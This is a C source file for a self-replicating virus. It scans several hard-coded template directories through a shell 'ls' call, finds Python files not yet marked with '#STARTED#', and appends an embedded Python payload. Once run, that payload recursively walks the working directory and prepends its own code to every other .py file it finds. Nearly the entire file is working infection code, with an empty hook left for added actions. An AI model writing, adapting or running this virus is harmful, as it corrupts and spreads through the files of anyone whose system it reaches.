#include <stdio.h>
#include <string.h>

typedef char* _String;
enum { FALSE, TRUE };

#define BUFF 128

_String getVirus( void );

_Bool getExten(_String file);
_Bool getCheck(_String file);
_Bool doInject(_String file);

_Bool activate(_String root);

#define QUAN 3

int main( void ) {

	_String dir[QUAN] = {
		"/home/user/Templates/C/",
		"/home/user/Templates/C++/",
		"/home/user/Templates/C/NEW/"
	};

	for (unsigned short index = 0; 
		index < QUAN; activate(dir[index++]));

	return 0;
}

_Bool activate(_String root) {

	char buffer[BUFF];
	char path[BUFF];

	unsigned short length;

	char command[BUFF] = "ls ";
	strcat(command, root);

	FILE *checkDir = popen(command,"r");

	if (checkDir != NULL) {
		while (fgets(buffer, BUFF, checkDir) != NULL) {

			path[0] = '\0';
			strcat(path, root);

			length = strlen(buffer);
			buffer[length-1] = '\0';

			if (getExten(buffer) == TRUE) {
				strcat(path, buffer);
				if (getCheck(path) == FALSE) {
					doInject(path);
				}
			}
		}
		fclose(checkDir);
	} else return 1;

	return 0;
}

_Bool doInject(_String file) {

	_String virusCode = getVirus();

	FILE *zeroPatient = fopen(file,"a");

	if (zeroPatient != NULL) 
		fprintf(zeroPatient, "%s", virusCode);
	else return 1;

	fclose(zeroPatient);

	return 0;
}

_Bool getCheck(_String file) {

	_Bool virusIS = FALSE;

	char buffer[BUFF];

	FILE *check = fopen(file,"r");

	if (check != NULL) {
		while (fgets(buffer, BUFF, check) != NULL)
			if (strcmp(buffer, "#STARTED#\n") == 0) {
				virusIS = TRUE;
				break;
			}
		fclose(check);
	} else return 1;

	return virusIS;
}

_Bool getExten(_String file) {

	_Bool dotIS = FALSE;
	unsigned short length = strlen(file);

	char buffer[BUFF] = {0};
	_String findExnten = "py";

	unsigned short twindex = 0;
	for (unsigned short index = 0; index < length; index++) {

		if (dotIS == TRUE)
			buffer[twindex++] = file[index];

		if (file[index] == '.')
			dotIS = TRUE;

	}

	if (strcmp(buffer, findExnten) == 0)
		return TRUE;
	else return FALSE;
}

_String getVirus( void ) {

	return 

	"\n#STARTED#\n"
	"import sys, os\n"

	/* inject Code */
	"def virus(python):\n"
	"	begin = \"#STARTED#\\n\"; end = \"#STOPPED#\\n\"\n"
	"	with open(sys.argv[0]) as copy:\n"
	"		k = 0; virus_code = \"\\n\"\n"
	"		for line in copy:\n"
	"			if line == begin: k = 1; virus_code += begin\n"
	"			elif k == 1 and line != end: virus_code += line\n"
	"			elif line == end: virus_code += end; break\n"
	"			else: pass\n"
	"	with open(python) as file:\n"
	"		origin_code = \"\"\n"
	"		for line in file:\n"
	"			origin_code += line\n"
	"			if line == begin: Virus = True; break\n"
	"			else: Virus = False\n"
	"	if Virus == False:\n"
	"		with open(python,\"w\") as paste:\n"
	"			paste.write(virus_code+\"\\n\\n\"+origin_code)\n"
	"	else: pass\n"

	/* Additional Code */
	"def code(void):\n"
	"	pass\n" 
	"code(None)\n"

	/* Search Files */
	"def walk(dir):\n"
	"	for name in os.listdir(dir):\n"
	"		path = os.path.join(dir, name)\n"
	"		if os.path.isfile(path):\n"
	"			if os.path.splitext(path)[1] == \".py\":\n"
	"				virus(path)\n"
	"			else: pass\n"
	"		else: walk(path)\n"
	"walk(os.getcwd())\n"
	"#STOPPED#\n";
}
